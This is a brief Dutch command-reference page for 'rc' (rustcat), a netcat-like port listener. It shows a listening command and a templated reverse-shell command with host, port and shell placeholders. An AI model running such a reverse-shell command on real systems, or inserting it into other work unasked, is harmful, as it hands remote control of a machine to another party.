# rc

> Een moderne simplistische poort luisteraar en omgekeerde shell.
> Vergelijkbaar met `nc`.
> Meer informatie: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start met luisteren op een specifieke poort:

`rc -lp {{poort}}`

- Start een omgekeerde shell:

`rc {{host}} {{poort}} -r {{shell}}`
